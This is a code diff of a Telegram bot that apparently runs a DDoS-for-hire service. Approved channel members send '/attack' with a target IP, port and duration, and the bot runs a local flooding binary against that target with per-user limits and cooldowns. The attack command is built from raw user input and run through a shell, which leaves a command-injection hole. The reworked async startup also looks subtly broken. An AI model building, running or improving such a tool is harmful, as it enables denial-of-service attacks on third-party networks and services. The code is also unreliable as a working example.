@@ -1,7 +1,6 @@
 import asyncio
 from telegram import Update
 from telegram.ext import Application, CommandHandler, CallbackContext
-import os
 from datetime import datetime, timedelta
 
 # Configuration
@@ -11,7 +10,7 @@ APPROVED_IDS_FILE = 'approved_ids.txt'
 ATTACK_STATS_FILE = 'attack_stats.txt'
 CHANNEL_ID = "@fyyffgggvvvgvvcc"  # Replace with your channel username
 MAX_ATTACKS_PER_USER = 5
-attack_in_progress = False
+attack_in_progress = {}  # Tracks attack status for each user
 cooldown_data = {}  # Stores cooldown timestamps for users
 attack_counts = {}  # Stores how many attacks each user has performed
 
@@ -181,64 +180,6 @@ async def details(update: Update, context: CallbackContext):
     
     await context.bot.send_message(chat_id=chat_id, text=stats_message, parse_mode='Markdown')
 
-async def attack(update: Update, context: CallbackContext):
-    """Launch an attack if the user is approved and a channel member."""
-    global attack_in_progress
-
-    chat_id = update.effective_chat.id
-    user_id = update.effective_user.id
-    user_username = update.effective_user.username  # Get the username of the user
-    args = context.args
-
-    if str(chat_id) not in approved_ids and str(user_id) not in approved_ids:
-        await context.bot.send_message(chat_id=chat_id, text="*⚠️ You need permission to use this bot.*", parse_mode='Markdown')
-        return
-
-    if not await is_member_of_channel(user_id, context):
-        await context.bot.send_message(chat_id=chat_id, text=f"*⚠️ You must join our channel ({CHANNEL_ID}) to use this feature.*", parse_mode='Markdown')
-        return
-
-    if len(args) != 3:
-        await context.bot.send_message(chat_id=chat_id, text="*Usage: /attack <ip> <port> <time>*", parse_mode='Markdown')
-        return
-
-    ip, port, time = args
-    if not time.isdigit():
-        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Attack time must be a number!*", parse_mode='Markdown')
-        return
-
-    # Check cooldown logic based on attack time
-    can_attack_now, error_message = can_attack(user_id, time)
-    if not can_attack_now:
-        await context.bot.send_message(chat_id=chat_id, text=error_message, parse_mode='Markdown')
-        return
-
-    # Check if attack limit is reached
-    if str(user_id) in attack_counts and attack_counts[str(user_id)] >= MAX_ATTACKS_PER_USER and user_id != ADMIN_USER_ID:
-        await context.bot.send_message(chat_id=chat_id, text="*⚠️ You have exceeded the attack limit.*", parse_mode='Markdown')
-        return
-
-    attack_counts[str(user_id)] = attack_counts.get(str(user_id), 0) + 1
-    save_attack_stats()
-
-    # Send attack launching message with image URL
-    image_url = "https://t.me/jwhu7hwbsnn/122"  # Replace with your image URL
-    await context.bot.send_photo(
-        chat_id=chat_id, 
-        photo=image_url, 
-        caption=(
-            f"*💥 ATTACK INITIATED! 💥*\n\n"
-            f"*🎯 TARGET IP:* {ip}\n"
-            f"*🔌 TARGET PORT:* {port}\n"
-            f"*⏱ ATTACK TIME:* {time} seconds\n"
-            f"*👤 LAUNCHED BY:* @{user_username}\n"
-            f"⚡ *Attack in progress...* ⚡\n\n"
-            f"Please wait for the attack to complete. Stay tuned!"
-        ), parse_mode='Markdown')
-
-    # Simulate attack process
-    await run_attack(chat_id, ip, port, time, context, user_username)
-
 async def run_attack(chat_id, ip, port, time, context, user_username):
     """Simulate an attack process."""
     global attack_in_progress
@@ -246,7 +187,7 @@ async def run_attack(chat_id, ip, port, time, context, user_username):
 
     try:
         process = await asyncio.create_subprocess_shell(
-            f"./bgmi {ip} {port} {time} 500",
+            f"./bgmi {ip} {port} {time} 500",  # Adjust this command to your attack tool
             stdout=asyncio.subprocess.PIPE,
             stderr=asyncio.subprocess.PIPE
         )
@@ -271,11 +212,85 @@ async def run_attack(chat_id, ip, port, time, context, user_username):
             ), 
             parse_mode='Markdown')
 
-def main():
+
+async def attack(update: Update, context: CallbackContext):
+    """Launch an attack if the user is approved and a channel member."""
+    chat_id = update.effective_chat.id
+    user_id = update.effective_user.id
+    user_username = update.effective_user.username  # Get the username of the user
+    args = context.args
+
+    if str(chat_id) not in approved_ids and str(user_id) not in approved_ids:
+        await context.bot.send_message(chat_id=chat_id, text="*⚠️ You need permission to use this bot.*", parse_mode='Markdown')
+        return
+
+    if not await is_member_of_channel(user_id, context):
+        await context.bot.send_message(chat_id=chat_id, text=f"*⚠️ You must join our channel ({CHANNEL_ID}) to use this feature.*", parse_mode='Markdown')
+        return
+
+    if len(args) != 3:
+        await context.bot.send_message(chat_id=chat_id, text="*Usage: /attack <ip> <port> <time>*", parse_mode='Markdown')
+        return
+
+    ip, port, time = args
+    if not time.isdigit():
+        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Attack time must be a number!*", parse_mode='Markdown')
+        return
+
+    # Check if the user is already attacking
+    if user_id in attack_in_progress and attack_in_progress[user_id]:
+        await context.bot.send_message(chat_id=chat_id, text="*⚠️ You are already in the middle of an attack. Please wait until it finishes.*", parse_mode='Markdown')
+        return
+
+    # Set the attack_in_progress flag for this user
+    attack_in_progress[user_id] = True
+
+    # Check cooldown logic based on attack time
+    can_attack_now, error_message = can_attack(user_id, time)
+    if not can_attack_now:
+        attack_in_progress[user_id] = False
+        await context.bot.send_message(chat_id=chat_id, text=error_message, parse_mode='Markdown')
+        return
+
+    # Check if attack limit is reached
+    if str(user_id) in attack_counts and attack_counts[str(user_id)] >= MAX_ATTACKS_PER_USER and user_id != ADMIN_USER_ID:
+        attack_in_progress[user_id] = False
+        await context.bot.send_message(chat_id=chat_id, text="*⚠️ You have exceeded the attack limit.*", parse_mode='Markdown')
+        return
+
+    attack_counts[str(user_id)] = attack_counts.get(str(user_id), 0) + 1
+    save_attack_stats()
+
+    # Send attack launching message with image URL
+    image_url = "https://t.me/jwhu7hwbsnn/122"  # Replace with your image URL
+    await context.bot.send_photo(
+        chat_id=chat_id, 
+        photo=image_url, 
+        caption=(
+            f"*💥 ATTACK INITIATED! 💥*\n\n"
+            f"*🎯 TARGET IP:* {ip}\n"
+            f"*🌐 TARGET PORT:* {port}\n"
+            f"*⏳ ATTACK DURATION:* {time} seconds\n"
+            f"*👤 USERNAME:* {user_username}\n\n"
+            f"Attack will run for {time} seconds.\n\n"
+            f"Stay tuned for results."
+        ),
+        parse_mode='Markdown'
+    )
+    
+    # Run the attack
+    await run_attack(chat_id, ip, port, time, context, user_username)
+
+    # After attack finishes, flag set back to False
+    attack_in_progress[user_id] = False
+
+
+# Main function to start the bot
+async def main():
     """Start the bot."""
     application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()
 
-    # Add command handlers
+    # Command Handlers
     application.add_handler(CommandHandler("start", start))
     application.add_handler(CommandHandler("help", help_command))
     application.add_handler(CommandHandler("approve", approve))
@@ -283,7 +298,7 @@ def main():
     application.add_handler(CommandHandler("details", details))
     application.add_handler(CommandHandler("attack", attack))
 
-    application.run_polling()
+    await application.run_polling()
 
-if __name__ == "__main__":
-    main()
+if __name__ == '__main__':
+    asyncio.run(main())
